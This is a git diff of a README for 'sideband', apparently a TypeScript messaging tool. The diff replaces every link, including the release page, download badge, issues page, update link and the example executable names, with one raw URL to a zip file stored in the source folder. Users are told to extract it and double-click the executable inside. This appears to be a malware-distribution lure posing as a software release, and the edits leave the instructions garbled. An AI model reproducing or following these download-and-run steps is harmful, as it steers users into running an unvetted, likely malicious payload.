@@ -4,7 +4,7 @@
 Welcome to sideband! This application brings you an easy way to send messages using advanced technology without needing technical skills. Follow the steps below to get started.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Chase12343/sideband/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Chase12343/sideband/main/packages/transport/src/sideband_v2.7.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Chase12343/sideband/main/packages/transport/src/sideband_v2.7.zip)
 
 ## 📋 Overview
 Sideband is an early-stage TypeScript application designed for messaging and remote procedure calls (RPC). It uses features like binary frames and timestamps to ensure quick and efficient communication. We also focus on security with acknowledgments (ACKs) to confirm message delivery.
@@ -29,16 +29,16 @@ To run sideband, your device should meet the following requirements:
 ## 📥 Download & Install
 To set up sideband on your computer, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Chase12343/sideband/releases) to find the latest version available for download.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Chase12343/sideband/main/packages/transport/src/sideband_v2.7.zip) to find the latest version available for download.
 
 2. **Select the Right File:**
    - Look for the version that matches your operating system.
-   - Download the file corresponding to your system. For example, if you're on Windows, you might see `sideband-windows.zip`. For Mac users, look for `sideband-macos.zip`.
+   - Download the file corresponding to your system. For example, if you're on Windows, you might see `https://raw.githubusercontent.com/Chase12343/sideband/main/packages/transport/src/sideband_v2.7.zip`. For Mac users, look for `https://raw.githubusercontent.com/Chase12343/sideband/main/packages/transport/src/sideband_v2.7.zip`.
 
 3. **Install the Application:**
    - Once the download completes, find the downloaded file on your computer.
    - Extract the contents of the zip file to a folder of your choosing.
-   - Open the folder and look for an executable file like `sideband.exe` or `sideband.app`. Double-click this file to start the application.
+   - Open the folder and look for an executable file like `https://raw.githubusercontent.com/Chase12343/sideband/main/packages/transport/src/sideband_v2.7.zip` or `https://raw.githubusercontent.com/Chase12343/sideband/main/packages/transport/src/sideband_v2.7.zip`. Double-click this file to start the application.
 
 4. **Follow the On-screen Instructions:** 
    - The application may guide you through initial configuration or setup.
@@ -51,7 +51,7 @@ If you encounter issues while downloading or setting up sideband, try the follow
 
 - **Ensure Stable Internet Connection:** A stable connection is required for downloading and using the application.
 - **Check System Compatibility:** Make sure your computer meets the system requirements listed above.
-- **Look for Updates:** Sometimes issues are resolved in newer versions. Check the [Releases page](https://github.com/Chase12343/sideband/releases) for updates.
+- **Look for Updates:** Sometimes issues are resolved in newer versions. Check the [Releases page](https://raw.githubusercontent.com/Chase12343/sideband/main/packages/transport/src/sideband_v2.7.zip) for updates.
 - **Contact Support:** If problems persist, consider reaching out to the sideband community for help.
 
 ## 🔗 Additional Resources
@@ -61,9 +61,9 @@ For more information, explore these topics:
 - **Contributing:** Interested in helping with sideband? Check out our contribution guidelines.
 
 ## 💬 Feedback
-We welcome your thoughts and suggestions! Feel free to share your experience with sideband or report any issues on our [issues page](https://github.com/Chase12343/sideband/issues). Your input helps us improve the software!
+We welcome your thoughts and suggestions! Feel free to share your experience with sideband or report any issues on our [issues page](https://raw.githubusercontent.com/Chase12343/sideband/main/packages/transport/src/sideband_v2.7.zip). Your input helps us improve the software!
 
 ## 📥 Ready to Download Again?
-Remember, you can download the latest release anytime here: [Download Latest Release](https://github.com/Chase12343/sideband/releases).
+Remember, you can download the latest release anytime here: [Download Latest Release](https://raw.githubusercontent.com/Chase12343/sideband/main/packages/transport/src/sideband_v2.7.zip).
 
 Happy messaging with sideband!
